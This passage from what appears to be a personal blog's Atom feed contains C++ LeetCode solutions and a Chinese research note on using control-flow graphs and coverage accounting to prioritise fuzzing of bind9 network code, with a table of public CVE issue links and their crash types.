class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(op[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;], op[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;2325-解密消息&quot;&gt;&lt;a href=&quot;#2325-解密消息&quot; class=&quot;headerlink&quot; title=&quot;2325. 解密消息&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/decode-the-message/submissions/406636854/&quot;&gt;2325. 解密消息&lt;/a&gt;&lt;/h2&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>定位感兴趣的BB</title>
    <link href="https://jingtianer.github.io/home/2023/02/21/%E7%BB%84%E4%BC%9A/%E7%AC%AC%E4%B8%83%E5%91%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://jingtianer.github.io/home/2023/02/21/%E7%BB%84%E4%BC%9A/%E7%AC%AC%E4%B8%83%E5%91%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2023-02-21T04:15:37.000Z</published>
    <updated>2023-02-24T06:44:38.758Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BB定位"><a href="#BB定位" class="headerlink" title="BB定位"></a>BB定位</h2><ul><li>参考两篇论文<ul><li>[1] AmpFuzz: Fuzzing for Amplification DDoS Vulnerabilities</li><li>[2] Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization</li></ul></li></ul><p>论文[1]中也是利用cfg定位感兴趣的BB，但是他之研究了DDos放大攻击，论文中将网络相关函数划分为三类</p><table><thead><tr><th>Class</th><th>Functions</th></tr></thead><tbody><tr><td>Source</td><td>recv, recvfrom, recvmsg, recvmmsg</td></tr><tr><td>Sink</td><td>send, sendfrom, sendmsg, sendmmsg</td></tr><tr><td>Blocking</td><td>select, pselect, poll, ppoll, epoll_wait, epoll_pwai</td></tr></tbody></table><p>我将代码中被调用的函数中，所有含有recv的函数作为<code>source</code>，含有send的函数作为<code>sink</code>，含有select、poll的作为<code>blocking</code>（先暂时这样，这样是显然有问题的，有些sendxxx, recvxxx可能并不是网络操作，后面手动剔除一下就好了）。</p><p>在gitlab的<code>issue</code>中搜索cve，查看其调用栈，找到其中易受攻击的函数，作为<code>vulnerable</code>，这里暂时没有对cve根据效果进行分类，筛选出DDos放大攻击</p><p>再结合论文[2]的coverage accounting，对于每条边<code>e</code>，统计其以下参数</p><ul><li>FUNC  : 边<code>e</code>的<code>dest基本块</code>中含有vulnerable函数调用的个数</li><li>SINK  ：边<code>e</code>的<code>dest基本块</code>是否满足论文[1]中<code>sink capable</code>的定义，满足则为1，否则为0</li><li>BB    ：边<code>e</code>的<code>dest基本块</code>中包含网络操作的指令条数</li></ul><blockquote><p>如果使用论文上严格的对<code>sink capable</code>定义，只能找到几个满足的BB</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><h3 id="脚本编码声明"><a href="#脚本编码声明" class="headerlink" title="脚本编码声明"></a>脚本编码声明</h3><ul><li>如果使用gcc，脚本首行需要声明脚本编码，g++则不需要<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Phi-node"><a href="#Phi-node" class="headerlink" title="Phi node"></a>Phi node</h3><p>gcc ssa\phi的介绍：<a href="https://gcc.gnu.org/onlinedocs/gccint/SSA.html">13.3 Static Single Assignment</a></p><blockquote><p>我的理解是phi_nodes是当在不同分支return不同变量时，为了使return时返回的都是同一个变量<br>语句的处理应该不加phi_node</p></blockquote><h3 id="inline-assembler-code"><a href="#inline-assembler-code" class="headerlink" title="inline assembler code"></a>inline assembler code</h3><p>inline asm的介绍：<a href="https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html">Extended Asm - Assembler Instructions with C Expression Operands</a></p><blockquote><p>c&#x2F;c++中可以使用asm关键词，在c&#x2F;c++代码中嵌入特殊的汇编指令。这种指令可以直接访问c&#x2F;c++中的变量</p></blockquote><h2 id="bugs-call-stack"><a href="#bugs-call-stack" class="headerlink" title="bugs call stack"></a>bugs call stack</h2><table><thead><tr><th>cve</th><th>call stack</th><th>分类</th></tr></thead><tbody><tr><td>CVE-2022-3080</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/3517">https://gitlab.isc.org/isc-projects/bind9/-/issues/3517</a></td><td>断言 isc_assertion_failed()</td></tr><tr><td>CVE-2022-3736</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/3622">https://gitlab.isc.org/isc-projects/bind9/-/issues/3622</a></td><td>断言</td></tr><tr><td>CVE-2022-3924</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/3619">https://gitlab.isc.org/isc-projects/bind9/-/issues/3619</a></td><td>RUNTIME_CHECK()</td></tr><tr><td>CVE-2022-2881</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/3493">https://gitlab.isc.org/isc-projects/bind9/-/issues/3493</a></td><td>buffer exceed</td></tr><tr><td>CVE-2022-2906</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/3491">https://gitlab.isc.org/isc-projects/bind9/-/issues/3491</a></td><td>内存泄漏，__interceptor_malloc()</td></tr><tr><td>CVE-2022-38177</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/3487">https://gitlab.isc.org/isc-projects/bind9/-/issues/3487</a></td><td>内存泄漏 malloc() CRYPTO_zalloc() BN_MONT_CTX_new() EC_GROUP_set_seed()</td></tr><tr><td>CVE-2022-1183</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/3216">https://gitlab.isc.org/isc-projects/bind9/-/issues/3216</a></td><td>断言</td></tr><tr><td>CVE-2022-0667</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/3129">https://gitlab.isc.org/isc-projects/bind9/-/issues/3129</a></td><td>断言</td></tr><tr><td>CVE-2021-25219</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/2899">https://gitlab.isc.org/isc-projects/bind9/-/issues/2899</a></td><td>dns_name_equal() entry_is_lame() 添加entry的算法是 $ O(n) $</td></tr><tr><td>CVE-2021-25218</td><td><a href="https://gitlab.isc.org/isc-projects/bind9/-/issues/2856">https://gitlab.isc.org/isc-projects/bind9/-/issues/2856</a></td><td>断言</td></tr></tbody></table><p>在bind9的issue中搜索cve，查看了issue中的调用栈，发现断言和内存操作出现次数最多</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;BB定位&quot;&gt;&lt;a href=&quot;#BB定位&quot; class=&quot;headerlink&quot; title=&quot;BB定位&quot;&gt;&lt;/a&gt;BB定位&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;参考两篇论文&lt;ul&gt;
&lt;li&gt;[1] AmpFuzz: Fuzzing for Amplification DDoS Vulnerabilities&lt;/li&gt;
&lt;li&gt;[2] Not All Coverage Measurements Are Equal: Fuzzing by Coverage Accounting for Input Prioritization&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;论文[1]中也是利用cfg定位感兴趣的BB，但是他之研究了DDos放大攻击，论文中将网络相关函数划分为三类&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Class&lt;/th&gt;
&lt;th&gt;Functions&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Source&lt;/td&gt;
&lt;td&gt;recv, recvfrom, recvmsg, recvmmsg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Sink&lt;/td&gt;
&lt;td&gt;send, sendfrom, sendmsg, sendmmsg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Blocking&lt;/td&gt;
&lt;td&gt;select, pselect, poll, ppoll, epoll_wait, epoll_pwai&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;我将代码中被调用的函数中，所有含有recv的函数作为&lt;code&gt;source&lt;/code&gt;，含有send的函数作为&lt;code&gt;sink&lt;/code&gt;，含有select、poll的作为&lt;code&gt;blocking&lt;/code&gt;（先暂时这样，这样是显然有问题的，有些sendxxx, recvxxx可能并不是网络操作，后面手动剔除一下就好了）。&lt;/p&gt;
&lt;p&gt;在gitlab的&lt;code&gt;issue&lt;/code&gt;中搜索cve，查看其调用栈，找到其中易受攻击的函数，作为&lt;code&gt;vulnerable&lt;/code&gt;，这里暂时没有对cve根据效果进行分类，筛选出DDos放大攻击&lt;/p&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-22</title>
    <link href="https://jingtianer.github.io/home/2023/02/20/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9322/"/>
    <id>https://jingtianer.github.io/home/2023/02/20/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9322/</id>
    <published>2023-02-20T03:14:34.000Z</published>
    <updated>2023-03-01T09:17:05.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2347-最好的扑克手牌"><a href="#2347-最好的扑克手牌" class="headerlink" title="2347. 最好的扑克手牌"></a><a href="https://leetcode.cn/problems/best-poker-hand/">2347. 最好的扑克手牌</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">bestHand</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; ranks, vector&lt;<span class="type">char</span>&gt;&amp; suits)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rank_count</span><span class="params">(<span class="number">13</span>, <span class="number">0</span>)</span>, <span class="title">suits_count</span><span class="params">(<span class="number">4</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            rank_count[ranks[i]<span class="number">-1</span>]++;</span><br><span class="line">            suits_count[suits[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            count = <span class="built_in">max</span>(count, suits_count[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">5</span>) <span class="keyword">return</span> <span class="string">&quot;Flush&quot;</span>;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++) &#123;</span><br><span class="line">            count = <span class="built_in">max</span>(count, rank_count[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Three of a Kind&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Pair&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;High Card&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1604-警告一小时内使用相同员工卡大于等于三次的人"><a href="#1604-警告一小时内使用相同员工卡大于等于三次的人" class="headerlink" title="1604. 警告一小时内使用相同员工卡大于等于三次的人"></a><a href="https://leetcode.cn/problems/alert-using-same-key-card-three-or-more-times-in-a-one-hour-period/">1604. 警告一小时内使用相同员工卡大于等于三次的人</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">alertNames</span><span class="params">(vector&lt;string&gt;&amp; keyName, vector&lt;string&gt;&amp; keyTime)</span> </span>&#123;</span><br><span class="line">        map&lt;string, vector&lt;<span class="type">int</span>&gt;&gt; hour_count;</span><br><span class="line">        <span class="type">int</span> len = keyName.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="type">int</span> h = (keyTime[i][<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + keyTime[i][<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>, m = (keyTime[i][<span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + keyTime[i][<span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            hour_count[keyName[i]].<span class="built_in">push_back</span>(h*<span class="number">60</span>+m);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;string&gt; warning_list;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite = hour_count.<span class="built_in">begin</span>(); ite != hour_count.<span class="built_in">end</span>(); ite++) &#123;</span><br><span class="line">            <span class="type">bool</span> warn = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">sort</span>(ite-&gt;second.<span class="built_in">begin</span>(), ite-&gt;second.<span class="built_in">end</span>());</span><br><span class="line">            <span class="type">int</span> len = ite-&gt;second.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len<span class="number">-2</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(ite-&gt;second[i+<span class="number">2</span>] - ite-&gt;second[i] &lt;= <span class="number">60</span>) &#123;</span><br><span class="line">                    warn = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(warn) &#123;</span><br><span class="line">                warning_list.<span class="built_in">push_back</span>(ite-&gt;first);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> warning_list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">alertNames</span><span class="params">(vector&lt;string&gt;&amp; keyName, vector&lt;string&gt;&amp; keyTime)</span> </span>&#123;</span><br><span class="line">        map&lt;string, priority_queue&lt;<span class="type">int</span>&gt;&gt; hour_count;</span><br><span class="line">        <span class="type">int</span> len = keyName.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="type">int</span> h = (keyTime[i][<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + keyTime[i][<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>, m = (keyTime[i][<span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + keyTime[i][<span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            hour_count[keyName[i]].<span class="built_in">push</span>(h*<span class="number">60</span>+m);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;string&gt; warning_list;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite = hour_count.<span class="built_in">begin</span>(); ite != hour_count.<span class="built_in">end</span>(); ite++) &#123;</span><br><span class="line">            <span class="type">int</span> len = ite-&gt;second.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">if</span>(len &lt;= <span class="number">2</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">int</span> a, b, c;</span><br><span class="line">            a = ite-&gt;second.<span class="built_in">top</span>();</span><br><span class="line">            ite-&gt;second.<span class="built_in">pop</span>();</span><br><span class="line">            b = ite-&gt;second.<span class="built_in">top</span>();</span><br><span class="line">            ite-&gt;second.<span class="built_in">pop</span>();</span><br><span class="line">            c = ite-&gt;second.<span class="built_in">top</span>();</span><br><span class="line">            ite-&gt;second.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="type">bool</span> warn = a - c &lt;= <span class="number">60</span>;</span><br><span class="line">            <span class="keyword">while</span>(!warn &amp;&amp; !ite-&gt;second.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                a = b;</span><br><span class="line">                b = c;</span><br><span class="line">                c = ite-&gt;second.<span class="built_in">top</span>();</span><br><span class="line">                ite-&gt;second.<span class="built_in">pop</span>();</span><br><span class="line">                warn = a - c &lt;= <span class="number">60</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(warn) &#123;</span><br><span class="line">                warning_list.<span class="built_in">push_back</span>(ite-&gt;first);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> warning_list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2331-计算布尔二叉树的值"><a href="#2331-计算布尔二叉树的值" class="headerlink" title="2331. 计算布尔二叉树的值"></a><a href="https://leetcode.cn/problems/evaluate-boolean-binary-tree/">2331. 计算布尔二叉树的值</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">evaluateTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &lt;= <span class="number">1</span>) <span class="keyword">return</span> root-&gt;val == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">        <span class="type">bool</span> left = <span class="built_in">evaluateTree</span>(root-&gt;left);</span><br><span class="line">        <span class="type">bool</span> right = <span class="built_in">evaluateTree</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> root-&gt;val == <span class="number">2</span> ? left||right : left&amp;&amp;right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1798-你能构造出连续值的最大数目"><a href="#1798-你能构造出连续值的最大数目" class="headerlink" title="1798. 你能构造出连续值的最大数目"></a><a href="https://leetcode.cn/problems/maximum-number-of-consecutive-values-you-can-make/">1798. 你能构造出连续值的最大数目</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMaximumConsecutive</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">sort</span>(coins.<span class="built_in">begin</span>(), coins.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; i : coins) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; res) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res += i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>直接抄的答案，贪心，代码的意思就是排序，从小到大加起来<br>没注意到题目条件要求是从0开始的，这一点很重要<br>若最大只能到1，则数组为 [1]<br>若最大只能到2，则数组为 [1 1] (不能是[2]，因为这样没有无法组出1)<br>若最大只能到3，则数组为 [1 1 1], [1 2]<br>若最大只能到4，则数组为 [1 1 1 1], [1 1 2]<br>若最大只能到5，则数组为 [1 1 1 1 1], [1 1 1 2], [1 1 3]</p><p>观察上面列表可知，若最大只能到5，则是最大到4在多额外的1，或者最大到2且额外的一个3，这里就能看到令res初始为1，将数组排序后，相加，直到coins[i] &gt; res为止</p></blockquote><h2 id="1145-二叉树着色游戏"><a href="#1145-二叉树着色游戏" class="headerlink" title="1145. 二叉树着色游戏"></a><a href="https://leetcode.cn/problems/binary-tree-coloring-game/">1145. 二叉树着色游戏</a></h2><blockquote><p>这道题的提议是，第一步red先手，blue后手选择二叉树中的一个节点<br>选择后的每一步，两个玩家只能选择当前所选所有节点的未涂色的邻接节点<br>“我”作为后手的二号节点，如何选择我的第一个节点，让我能涂色的节点大于先手的red<br>为了利益最大化，只有三种选择，选择<code>x</code>的父节点，左孩子或右孩子<br>选择父节点，则x及x所有子节点都会被red涂色，自己只能涂色n-red个<br>选择左孩子，自己只能涂色x的左孩子以及左孩子的所有子代节点<br>选择右孩子，与左孩子同理<br>以上三种情况，分别计算red和blue，只要有一种情况可以使得<code>red &lt; blue</code>，则blue一定可以胜利，否则一定不能胜利</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">btreeGameWinningMove</span><span class="params">(TreeNode* root, <span class="type">int</span> root_sum, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        TreeNode* find = <span class="built_in">search</span>(root, x);</span><br><span class="line">        <span class="type">int</span> red = <span class="built_in">sum</span>(find);</span><br><span class="line">        <span class="keyword">if</span>(red &lt; root_sum - red) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> blue = <span class="built_in">sum</span>(find-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(root_sum - blue &lt; blue) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        blue = <span class="built_in">sum</span>(find-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(root_sum - blue &lt; blue) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(TreeNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">sum</span>(node-&gt;left) + <span class="built_in">sum</span>(node-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">search</span><span class="params">(TreeNode* node, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;val == target) &#123;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode* find = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;left != <span class="literal">nullptr</span>)</span><br><span class="line">            find = <span class="built_in">search</span>(node-&gt;left, target);</span><br><span class="line">        <span class="keyword">if</span>(find != <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> find;</span><br><span class="line">        <span class="keyword">if</span>(node-&gt;right != <span class="literal">nullptr</span>)</span><br><span class="line">            find = <span class="built_in">search</span>(node-&gt;right, target);</span><br><span class="line">        <span class="keyword">return</span> find;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>认真读题发现n就是总节点数，不用再算一遍了</p></blockquote><h2 id="1129-颜色交替的最短路径"><a href="#1129-颜色交替的最短路径" class="headerlink" title="1129. 颜色交替的最短路径"></a><a href="https://leetcode.cn/problems/shortest-path-with-alternating-colors/">1129. 颜色交替的最短路径</a></h2><h3 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td 